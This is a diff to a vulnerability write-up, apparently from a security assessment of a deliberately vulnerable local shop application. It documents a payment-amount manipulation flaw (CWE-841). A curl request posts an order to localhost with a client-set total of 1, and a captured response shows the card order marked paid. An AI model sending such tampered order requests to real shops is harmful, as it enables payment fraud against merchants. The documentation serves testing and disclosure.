@@ -1,6 +1,6 @@
 # V6: Payment amount manipulation
 
-Baseline reference: baseline-vulnerable
+Baseline reference: baseline-vulnerable (`cb68a377f5b8cdc3b12f86883ac6fb703ef5e405`)
 Primary mapping: CWE-841: Improper Enforcement of Behavioral Workflow
 
 ## Reproduction request
@@ -8,7 +8,7 @@ Primary mapping: CWE-841: Improper Enforcement of Behavioral Workflow
 ```bash
 curl -i -X POST http://localhost:5000/api/orders \
   -H 'Content-Type: application/json' \
-  --data '{"userId":"CUSTOMER_A","paymentMethod":"card","totalAmount":1,"items":[...]} '
+  --data '{"userId":"00000000-0000-4000-8000-000000000001","items":[{"productId":"0000000000000000000000d1","quantity":2}],"paymentMethod":"card","totalAmount":1,"currency":"usd","deliveryAddress":"Synthetic Address A","phoneNumber":"0700000001"}'
 ```
 
 ## Baseline source result
@@ -20,4 +20,16 @@ curl -i -X POST http://localhost:5000/api/orders \
 
 Impact: The client-selected amount is sent to Stripe and card orders are marked paid without server-side confirmation that the amount matches trusted product prices.
 
-This Phase 3 artifact is a reproducible source-level baseline proof. The curl request is the local HTTP reproduction recipe; live response captures are added after the affected local service is started. No live response is claimed by this artifact.
+This Phase 3 artifact is a reproducible source-level baseline proof.
+
+## Live baseline response
+
+Run from the isolated baseline checkout without credentials. The product fixture price is 1250 per item and quantity is 2, so the trusted total would be 2500:
+
+```text
+HTTP/1.1 201 Created
+Content-Type: application/json; charset=utf-8
+{"message":"Order created successfully","order":{"userId":"00000000-0000-4000-8000-000000000001","totalAmount":1,"currency":"usd","paymentMethod":"card","status":"paid"}}
+```
+
+The baseline accepted the client amount of 1 and marked the card order paid. The complete response contained only synthetic fixture data.
